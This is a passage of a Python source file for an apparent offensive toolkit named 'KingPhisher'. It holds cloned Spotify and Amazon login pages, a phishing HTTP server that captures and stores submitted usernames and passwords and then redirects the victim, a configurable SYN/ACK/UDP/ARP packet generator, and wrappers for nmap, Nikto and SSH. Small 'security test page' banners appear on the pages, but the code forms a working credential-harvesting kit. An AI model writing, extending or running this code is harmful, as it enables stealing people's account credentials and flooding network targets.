input{width:100%;padding:14px;margin:10px 0;background:#3e3e3e;border:none;border-radius:40px;color:#fff}
button{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:40px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">Spotify</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_amazon_template(self):
        return """<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #ddd;border-radius:8px;padding:32px;width:400px}
.logo{color:#ff9900;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#ff9900;color:#000;border:none;border-radius:8px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">amazon</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or mobile phone number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_custom_template(self):
        return """<!DOCTYPE html>
<html><head><title>Secure Login Portal</title>
<style>body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#764ba2;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:8px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo"><h1>Secure Portal</h1></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Login</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def create_session(self, user: str, platform: str) -> str:
        session_id = str(uuid.uuid4())[:8]
        try:
            self.cursor.execute('''
                INSERT INTO sessions (id, user, platform, created_at, last_active, active)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1)
            ''', (session_id, user, platform))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        try:
            self.cursor.execute('''
                UPDATE sessions SET last_active = CURRENT_TIMESTAMP, commands_count = commands_count + 1
                WHERE id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        try:
            self.cursor.execute('''
                UPDATE sessions SET active = 0, last_active = CURRENT_TIMESTAMP WHERE id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def log_command(self, session_id: str, command: str, source: str, platform: str,
                   success: bool, output: str, execution_time: float):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (session_id, command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (session_id, command, source, platform, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, alert: ThreatAlert, platform: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken, platform)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken, platform))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_platform_message(self, platform: str, sender: str, message: str, response: str):
        try:
            self.cursor.execute('''
                INSERT INTO platform_messages (platform, sender, message, response)
                VALUES (?, ?, ?, ?)
            ''', (platform, sender, message[:500], response[:1000]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log message: {e}")
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, added_date)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        try:
            self.cursor.execute('DELETE FROM managed_ips WHERE ip_address = ?', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                self.cursor.execute('SELECT * FROM managed_ips ORDER BY added_date DESC')
            else:
                self.cursor.execute('SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM managed_ips WHERE ip_address = ?', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def get_threats_by_ip(self, ip: str, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM threats WHERE source_ip = ? ORDER BY timestamp DESC LIMIT ?
            ''', (ip, limit))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats by IP: {e}")
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['total_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM sessions')
            stats['total_sessions'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM sessions WHERE active = 1')
            stats['active_sessions'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 60) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Command timed out after {timeout}s', 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['ping', '-n', str(count), target])
        else:
            return NetworkTools.execute_command(['ping', '-c', str(count), target])
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['tracert', '-d', target])
        else:
            return NetworkTools.execute_command(['traceroute', '-n', target])
    
    @staticmethod
    def nmap_scan(target: str, ports: str = "1-1000") -> Dict:
        try:
            cmd = ['nmap', '-T4', '-F', target] if ports == "1-1000" else ['nmap', '-p', ports, target]
            return NetworkTools.execute_command(cmd, timeout=300)
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> Dict:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available'}
        try:
            result = whois.whois(target)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 'isp': data.get('isp')}
            return {'success': False, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def shorten_url(url: str) -> str:
        if not SHORTENER_AVAILABLE:
            return url
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        if not QRCODE_AVAILABLE:
            return False
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except:
            return False
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=KingPhisher_Block_{ip}', 'dir=in', 'action=block', f'remoteip={ip}'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=KingPhisher_Block_{ip}'], timeout=10)
                return True
            return False
        except:
            return False

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        try:
            server_id = str(uuid.uuid4())[:8]
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            server = SSHServer(
                id=server_id, name=name, host=host, port=port, username=username,
                password=password, key_file=key_file, use_key=key_file is not None,
                timeout=self.default_timeout, notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            if self.db.add_ssh_server(server):
                return {'success': True, 'server_id': server_id, 'message': f'Server {name} added successfully'}
            return {'success': False, 'error': 'Failed to add server to database'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def connect(self, server_id: str) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                connect_kwargs = {'hostname': server['host'], 'port': server['port'],
                                 'username': server['username'], 'timeout': server.get('timeout', self.default_timeout)}
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                client.connect(**connect_kwargs)
                self.connections[server_id] = client
                self.db.update_ssh_server_status(server_id, 'connected')
                return {'success': True, 'message': f'Connected to {server["name"]} ({server["host"]})'}
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    try:
                        self.connections[server_id].close()
                    except:
                        pass
                    del self.connections[server_id]
                    self.db.update_ssh_server_status(server_id, 'disconnected')
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        start_time = time.time()
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False, output='', error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time, server=server_id)
        client = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout or self.default_timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            execution_time = time.time() - start_time
            result = SSHCommandResult(success=len(error) == 0, output=output, error=error if error else None,
                                     execution_time=execution_time, server=server_name)
            self.db.log_ssh_command(server_id=server_id, command=command, success=result.success,
                                   output=output, execution_time=execution_time, executed_by=executed_by)
            return result
        except Exception as e:
            self.disconnect(server_id)
            return SSHCommandResult(success=False, output='', error=str(e),
                                   execution_time=time.time() - start_time, server=server_name)
    
    def get_servers(self) -> List[Dict]:
        servers = self.db.get_ssh_servers()
        for server in servers:
            server['connected'] = server['id'] in self.connections
        return servers

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = ['tcp_connect', 'http_get', 'http_post', 'https', 'dns']
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend(['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'arp'])
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100, executed_by: str = "system") -> TrafficGenerator:
        max_duration = self.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum ({max_duration} seconds)")
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP: {target_ip}")
        if port is None:
            if traffic_type in ['http_get', 'http_post']:
                port = 80
            elif traffic_type == 'https':
                port = 443
            elif traffic_type == 'dns':
                port = 53
            elif traffic_type in ['tcp_syn', 'tcp_ack', 'tcp_connect']:
                port = 80
            elif traffic_type == 'udp':
                port = 53
            else:
                port = 0
        generator = TrafficGenerator(
            traffic_type=traffic_type, target_ip=target_ip, target_port=port,
            duration=duration, start_time=datetime.datetime.now().isoformat(), status="running")
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        thread = threading.Thread(target=self._run_traffic_generator,
                                 args=(generator_id, generator, packet_rate, stop_event))
        thread.daemon = True
        thread.start()
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator,
                               packet_rate: int, stop_event: threading.Event):
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            generator_func = self._get_generator_function(generator.traffic_type)
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    time.sleep(0.1)
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            self.db.log_traffic(generator)
        except Exception as e:
            generator.status = "failed"
            self.db.log_traffic(generator)
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        generators = {
            'icmp': self._generate_icmp, 'tcp_syn': self._generate_tcp_syn,
            'tcp_ack': self._generate_tcp_ack, 'tcp_connect': self._generate_tcp_connect,
            'udp': self._generate_udp, 'http_get': self._generate_http_get,
            'http_post': self._generate_http_post, 'https': self._generate_https,
            'dns': self._generate_dns, 'arp': self._generate_arp
        }
        return generators.get(traffic_type, self._generate_tcp_connect)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, ICMP, send
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: KingPhisher\r\n\r\n"
            sock.send(data.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, UDP, send
                data = b"KingPhisher Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"KingPhisher Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "KingPhisher"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=kingphisher"
            headers = {"User-Agent": "KingPhisher", "Content-Length": str(len(data))}
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "KingPhisher"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import Ether, ARP, sendp
            local_mac = self._get_local_mac()
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id, "target_ip": generator.target_ip, "traffic_type": generator.traffic_type,
                "duration": generator.duration, "packets_sent": generator.packets_sent
            })
        return active
    
    def get_traffic_types_help(self) -> str:
        help_text = "Available Traffic Types:\n\n📡 Basic Traffic:\n"
        help_text += "  icmp, tcp_syn, tcp_ack, tcp_connect, udp\n"
        help_text += "  http_get, http_post, https, dns, arp\n"
        return help_text

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        if not self.nikto_available:
            return {'success': False, 'error': 'Nikto not installed'}
        try:
            cmd = ['nikto', '-host', target]
            if options.get('ssl') or target.startswith('https://'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-Tuning', options['tuning']])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 300))
            scan_time = time.time() - start_time
            vulnerabilities = self._parse_output(result.stdout)
            return {
                'success': result.returncode == 0, 'target': target,
                'timestamp': datetime.datetime.now().isoformat(), 'vulnerabilities': vulnerabilities,
                'scan_time': scan_time, 'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout', 'target': target}
        except Exception as e:
            return {'success': False, 'error': str(e), 'target': target}
    
    def _parse_output(self, output: str) -> List[Dict]:
        vulnerabilities = []
        for line in output.split('\n'):
            if '+ ' in line or 'OSVDB' in line or 'CVE' in line:
                vulnerabilities.append({'description': line.strip(), 'severity': Severity.MEDIUM})
        return vulnerabilities

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        if self.path == '/':
            self.send_phishing_page()
        elif self.path.startswith('/capture'):
            self.send_response(302)
            self.send_header('Location', 'https://www.example.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}\n  Username: {username}\n  Password: {password}")
            self.send_response(302)
            self.send_header('Location', 'https://www.example.com')
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    def get_url(self) -> str:
        return f"http://{NetworkTools.get_local_ip()}:8080"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict:
        try:
            link_id = str(uuid.uuid4())[:8]
            templates = self.db.get_phishing_templates(platform)
            if templates:
                html_content = templates[0].get('html_content', '')
            else:
                html_content = self._get_default_template(platform)
            phishing_link = PhishingLink(
                id=link_id, platform=platform, original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080", template=platform,
                created_at=datetime.datetime.now().isoformat())
            self.db.save_phishing_link(phishing_link)
            self.active_links[link_id] = {'platform': platform, 'html': html_content}
            return {'success': True, 'link_id': link_id, 'platform': platform, 'phishing_url': phishing_link.phishing_url}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    def _get_default_template(self, platform: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{platform} Login</title>
<style>body{{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f0f2f5}}
.login-box{{background:white;border-radius:8px;padding:40px;width:350px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}}
.logo{{font-size:32px;text-align:center;margin-bottom:20px}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}}
button{{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}}
</style></head>
<body><div class="login-box"><div class="logo">{platform}</div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    def stop_phishing_server(self):
        self.phishing_server.stop()
    def get_server_url(self) -> str:
        return self.phishing_server.get_url()
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': lid, 'platform': data['platform']} for lid, data in self.active_links.items()]
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
